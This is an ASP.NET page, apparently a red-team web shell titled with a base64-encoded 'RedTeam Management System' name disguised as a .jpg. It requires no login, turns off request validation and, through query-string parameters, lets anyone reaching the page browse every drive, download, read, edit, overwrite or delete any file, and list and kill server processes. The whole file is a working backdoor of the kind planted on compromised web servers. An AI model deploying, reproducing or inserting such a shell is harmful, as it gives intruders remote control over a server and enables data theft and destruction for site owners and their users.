<%@ Page Language="C#" validateRequest="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string s = Request.QueryString["act"];
        string d = Request.QueryString["dir"];
        if (d == null) d = Server.MapPath("~/");

        switch (s)
        {
            case "edit":
                if (ishave(d))
                {
                    edit(d);
                    TextBox_MAIN.Visible = true;
                    list(d);
                }
                break;

            case "download":
                if (ishave(d))
                {
                    down(d);
                    list(d);
                }
                break;

            case "del":
                if (ishave(d))
                {
                    del(d);
                    list(d);
                }
                break;

            default:
                list(d);
                break;
        }
    }

    private bool ishave(string path)
    {
        FileInfo newfile = new FileInfo(path);
        return newfile.Exists;
    }

    private void edit(string path)
    {
        if (!IsPostBack)
        {
            using (StreamReader filestr = new StreamReader(path, Encoding.Default))
            {
                TextBox_MAIN.Text = filestr.ReadToEnd();
            }
        }
    }

    private void del(string path)
    {
        FileInfo file = new FileInfo(path);
        file.Delete();
    }

    private void down(string path)
    {
        FileInfo file = new FileInfo(path);
        Response.Clear();
        Response.AddHeader("Content-Disposition", "attachment; filename=" + file.Name);
        Response.AddHeader("Content-Length", file.Length.ToString());
        Response.ContentType = "application/octet-stream";
        Response.Filter.Close();
        Response.WriteFile(file.FullName);
        Response.End();
    }

    private void list(string path)
    {
        string[] driverlist = Directory.GetLogicalDrives();
        TreeView_file.Nodes.Clear();
        bool Isthis = true;

        for (int i = 0; i < driverlist.Length; i++)
        {
            TreeNode item = new TreeNode();
            item.Text = driverlist[i];
            item.NavigateUrl = "?dir=" + driverlist[i];
            TreeView_file.Nodes.Add(item);

            if (path != null && Isthis)
            {
                TreeNode item0 = new TreeNode();
                item0.Text = "[..] Parent Directory";

                if (path.Length > path.LastIndexOf("\\"))
                    path = path.Substring(0, path.LastIndexOf("\\") + 1);

                DirectoryInfo folder = new DirectoryInfo(path);
                FileSystemInfo[] fileinfo = folder.GetFileSystemInfos();

                if (folder.Parent == null)
                    item0.NavigateUrl = "?dir=" + path;
                else
                    item0.NavigateUrl = "?dir=" + folder.Parent.FullName;

                item.ChildNodes.Add(item0);

                Table1.Rows.Clear();

                int m = 0;
                for (int j = 0; j < fileinfo.Length; j++)
                {
                    FileInfo file = fileinfo[j] as FileInfo;
                    if (file != null)
                    {
                        TableRow row = new TableRow();
                        Table1.Rows.Add(row);

                        TableCell cell = new TableCell();
                        HyperLink namelink = new HyperLink();
                        namelink.Text = file.Name;
                        namelink.NavigateUrl = "?act=download&dir=" + file.FullName;
                        cell.Controls.Add(namelink);
                        Table1.Rows[m].Cells.Add(cell);
                        cell.Width = 240;

                        TableCell cell_sec = new TableCell();
                        cell_sec.Text = file.Attributes.ToString();
                        Table1.Rows[m].Cells.Add(cell_sec);

                        TableCell cell_size = new TableCell();
                        cell_size.Text = file.Length.ToString() + " size";
                        Table1.Rows[m].Cells.Add(cell_size);

                        TableCell cell1 = new TableCell();
                        HyperLink namelink1 = new HyperLink();
                        namelink1.Text = "edit";
                        namelink1.NavigateUrl = "?act=edit&dir=" + file.FullName;
                        cell1.Controls.Add(namelink1);
                        Table1.Rows[m].Cells.Add(cell1);

                        TableCell cell2 = new TableCell();
                        HyperLink namelink2 = new HyperLink();
                        namelink2.Text = "del";
                        namelink2.NavigateUrl = "?act=del&dir=" + file.FullName;
                        cell2.Controls.Add(namelink2);
                        Table1.Rows[m].Cells.Add(cell2);

                        m++;
                    }
                    else
                    {
                        currentpath.Text = path;
                        TreeNode pnode = new TreeNode();
                        pnode.Text = fileinfo[j].Name;
                        pnode.NavigateUrl = "?dir=" + fileinfo[j].FullName + "\\";
                        TreeView_file.Nodes[i].ChildNodes.Add(pnode);
                    }
                    Isthis = false;
                }
            }
        }
    }

    protected void Button6_Click(object sender, EventArgs e)
    {
        Panel_file.Visible = true;
        panel_procress.Visible = false;
        list(MapPath("~/"));
    }

    protected void sysinfo_Click(object sender, EventArgs e)
    {
        panel_procress.Visible = false;
        Panel_file.Visible = true;
        list(MapPath("~/"));
    }

    protected void init_Click(object sender, EventArgs e)
    {
        TextBox_MAIN.Text = "";
        msg.Text = "initialization";
    }

    protected void filesave_Click(object sender, EventArgs e)
    {
        using (StreamWriter filewrite = new StreamWriter(Request.QueryString["dir"], false, Encoding.Default))
        {
            filewrite.Write(TextBox_MAIN.Text);
        }
        msg.Text = "Successfully saved";
    }

    private void KillProcess(string processName)
    {
        try
        {
            foreach (Process thisproc in Process.GetProcessesByName(processName))
            {
                if (!thisproc.CloseMainWindow())
                {
                    thisproc.Kill();
                }
            }
        }
        catch (Exception)
        {
            msg.Text = "Sorry! can't end the process";
        }
    }

    protected void LinkButton_prc_Click(object sender, EventArgs e)
    {
        Panel_file.Visible = false;
        panel_procress.Visible = true;
        lisproc();
        Button_kill.Attributes.Add("onclick", "javascript: return confirm('Are you really going to end this process?');");
    }

    private void lisproc()
    {
        ListBox1.Items.Clear();
        foreach (Process thisProc in Process.GetProcesses())
        {
            string tempName = thisProc.ProcessName;
            ListBox1.Items.Add(tempName);
        }
    }

    protected void Button_kill_Click(object sender, EventArgs e)
    {
        if (ListBox1.SelectedItem != null)
        {
            KillProcess(ListBox1.SelectedItem.Text);
            msg.Text = "ok!";
            lisproc();
        }
    }

    protected void Button4_Click(object sender, EventArgs e)
    {
        lisproc();
    }

    protected void LINK_IIS_Click(object sender, EventArgs e)
    {
        panel_procress.Visible = false;
        TextBox_MAIN.Visible = false;
    }

    protected void LinkButton3_Click(object sender, EventArgs e)
    {
        Session["login"] = "";
        Response.Redirect("#");
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>UmVkVGVhbSBNYW5hZ2VtZW50IFN5c3RlbQ.jpg</title>
</head>
<body>
    <form id="form1" runat="server">
        <div id="head">
            <font color="#2c3315"><b>UmVkVGVhbSBNYW5hZ2VtZW50IFN5c3RlbQ.jpg</b></font>&nbsp;
            <div>basic skills
                <asp:LinkButton ID="sysinfo" runat="server" OnClick="sysinfo_Click" Height="14px" Width="48px">File_M</asp:LinkButton>&nbsp;
                <asp:LinkButton ID="LinkButton_prc" runat="server" OnClick="LinkButton_prc_Click" Height="14px" Width="48px">Proc_M</asp:LinkButton>&nbsp;
                <asp:LinkButton ID="LinkButton3" runat="server" Height="14px" OnClick="LinkButton3_Click">Exit</asp:LinkButton>
            </div>

            <div>Current Path
                <asp:TextBox ID="currentpath" runat="server" ForeColor="#2c3315" Height="14px" Width="497px"></asp:TextBox>
                <asp:Button ID="Button6" runat="server" OnClick="Button6_Click" Text="Home" Height="20px" Width="64px" /><br />
                <div class="msg_css">
                    <strong>Prompt information:</strong><asp:Label ID="msg" runat="server" Text="RedTeam Management System"></asp:Label>
                </div>
            </div>
        </div>

        <div class="files">
            <asp:Panel ID="Panel_file" runat="server" Width="100%" Wrap="False">
                <div class="tree_file">
                    <asp:TreeView ID="TreeView_file" runat="server" AutoGenerateDataBindings="False" BorderColor="Gray" BorderWidth="1px" EnableTheming="False" ShowLines="True" ImageSet="Msdn" NodeIndent="15">
                        <ParentNodeStyle Font-Bold="False" />
                        <HoverNodeStyle Font-Underline="True" ForeColor="#6666AA" />
                        <SelectedNodeStyle BackColor="#B5B5B5" Font-Underline="False" HorizontalPadding="0px" VerticalPadding="0px" />
                        <NodeStyle Font-Names="Tahoma" Font-Size="8pt" ForeColor="Black" HorizontalPadding="2px" NodeSpacing="0px" VerticalPadding="2px" />
                    </asp:TreeView>
                </div>

                <div class="table_file">
                    <asp:Table ID="Table1" runat="server" HorizontalAlign="Left" Width="100%"></asp:Table>
                </div>
            </asp:Panel>

            <div class="panel_proc">
                <asp:Panel ID="panel_procress" runat="server" Width="100%" Direction="LeftToRight" HorizontalAlign="Left" Visible="False">
                    <asp:ListBox ID="ListBox1" runat="server" Width="340px" Height="130px" SelectionMode="Single"></asp:ListBox>
                    <asp:Button ID="Button_kill" runat="server" Text="End Process" Width="84px" Height="20px" />
                    <asp:Button ID="Button4" runat="server" Text="Refresh" Width="64px" Height="20px" />
                </asp:Panel>
            </div>

            <div class="editfile">
                <asp:TextBox ID="TextBox_MAIN" runat="server" TextMode="MultiLine" Width="96%" Height="300px" Visible="False"></asp:TextBox>
                <asp:Button ID="filesave" runat="server" Text="Save" OnClick="filesave_Click" />
                <asp:Button ID="init" runat="server" Text="Reset" OnClick="init_Click" />
            </div>
        </div>
    </form>
</body>
</html>
